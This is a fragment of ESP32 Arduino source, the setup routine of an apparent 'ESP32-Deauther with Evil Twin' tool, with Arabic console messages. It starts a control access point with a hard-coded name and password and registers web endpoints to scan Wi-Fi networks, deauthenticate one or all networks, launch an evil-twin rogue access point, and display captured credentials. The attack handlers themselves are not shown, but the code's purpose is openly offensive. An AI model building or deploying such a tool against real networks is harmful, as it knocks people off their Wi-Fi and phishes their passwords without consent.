// =============================================
// SETUP
// =============================================

void setup() {
    Serial.begin(115200);
    Serial.println("\n=====================================");
    Serial.println("🎭 ESP32-Deauther مع Evil Twin v2.0");
    Serial.println("=====================================");

    // بدء نقطة الوصول
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ap_ssid, ap_password);
    IPAddress ip = WiFi.softAPIP();
    Serial.printf("✅ تم تشغيل نقطة الوصول: %s\n", ap_ssid);
    Serial.printf("📡 IP: %s\n", ip.toString().c_str());
    Serial.printf("🔑 كلمة المرور: %s\n", ap_password);

    // إعداد الخادم
    server.on("/", handleRoot);
    server.on("/scan", HTTP_POST, handleScan);
    server.on("/deauth", HTTP_POST, handleDeauth);
    server.on("/deauthall", HTTP_POST, handleDeauthAll);
    server.on("/stopdeauth", HTTP_POST, handleStopDeauth);
    server.on("/eviltwin", HTTP_POST, handleEvilTwin);
    server.on("/stopeviltwin", HTTP_POST, handleStopEvilTwin);
    server.on("/credentials", handleCredentials);
    server.on("/status", handleStatus);

    server.begin();
    Serial.println("✅ خادم الويب يعمل");

    // مسح تلقائي للشبكات
    delay(1000);
    scan_networks();

    Serial.println("\n=====================================");
    Serial.println("🎯 الجهاز جاهز!");
    Serial.println("📱 اتصل بشبكة: kerolos");
    Serial.println("🔑 كلمة المرور: espkerolos");
    Serial.println("🌐 افتح: http://192.168.4.1");
    Serial.println("=====================================\n");
}

